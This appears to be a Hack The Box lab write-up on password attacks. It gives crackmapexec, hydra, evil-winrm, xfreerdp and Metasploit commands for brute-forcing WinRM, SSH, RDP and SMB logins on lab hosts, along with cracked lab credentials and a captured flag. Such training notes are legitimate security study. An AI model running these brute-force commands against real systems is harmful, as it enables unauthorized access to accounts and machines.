
#### WINRM

>[! Note ]
> It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).


#### CrackMapExec

>[! Note ]
> Can be used for SMB, LDAP, MSSQL and others

**Usage**
`crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>`

Example:
```go
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

Example:
```go
crackmapexec smb 10.129.42.197 -u user.list -p password.list --shares
```

#### Evil-WinRM

Allows you to communicate with WinRM 

**Usage**
`evil-winrm -i <target-IP> -u <username> -p <password>`

Example:
```go
evil-winrm -i 10.129.42.197 -u user -p password
```

#### Hydra

**Hydra-SSH**
```go
hydra -L user.list -P password.list ssh://10.129.42.197
```

Hydra-RDP
```go
hydra -L user.list -P password.list rdp://10.129.42.197
```

Hydra-SMB
```go
hydra -L user.list -P password.list smb://10.129.42.197
```

#### xFreeRDP
```go
xfreerdp /v:10.129.42.197 /u:user /p:password
```

>[! Warning]
>
> If you can encounter an error while compiling Hydra to crack an SMB password, you can re-compile or use metasploit's `auxiliary/scanner/smb/smb_login` 

### Questions

IP
```go
10.129.249.226
```

SSH
```go
ssh USERNAME@10.129.249.226
```

### Question 1

Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

#### Crackmapexec

```go
crackmapexec winrm 10.129.219.222 -u username.list -p password.list
```

Found the credentials!
```go
john:november
```

Use evil-winrm to log into the machine
```go
evil-winrm -i 10.129.219.222 -u john -p november
```

### Question 2

Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer

IP
```
10.129.219.222
```

```go
hydra -L username.list -P password.list ssh://10.129.219.222
```

Credentials
```go
dennis:rockstar
```

### Question 3

 Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```go
hydra -L username.list -P password.list rdp://10.129.219.222
```

Credentials
```go
chris:78956123
```

```go
xfreerdp /v:10.129.219.222 /u:chris /p:78956123 /dynamic-resolution /cert:ignore /log-level:DEBUG
```

### Question 4

Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```go
crackmapexec smb 10.129.219.222 -u username.list -p password.list --shares
```

Credentials
```go
john:november
```

```go
smbclient -U john \\\\10.129.219.222\\CASSIE
```

Won't let me access

#### MSFCONSOLE
```go
use auxiliary/scanner/smb/smb_login
```

```go
options
```

```go
set user_file username.list
```

```go
set pass_file password.list
```

```go
set rhosts 10.129.219.222
```

This will show the share `CASSIE` is available, indicating the user `cassie` has access

Credentials

```go
cassie:12345678910
```

```go
smbclient -U cassie '\\10.129.219.222\CASSIE'
```

HTB{R3m0t3DeskIsw4yT00easy}
